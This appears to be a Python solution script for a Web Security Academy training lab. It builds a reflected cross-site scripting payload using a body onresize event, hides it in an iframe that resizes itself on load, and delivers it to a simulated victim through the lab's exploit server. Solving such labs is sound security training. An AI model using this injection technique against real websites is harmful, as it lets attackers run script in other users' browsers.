from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<body onresize='print()'>"
    iframe = f"""<iframe src="{session.url}?search={xss}" onload=this.width='100px'>"""

    server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    server.deliver_exploit_to_victim("/exploit", headers, iframe)
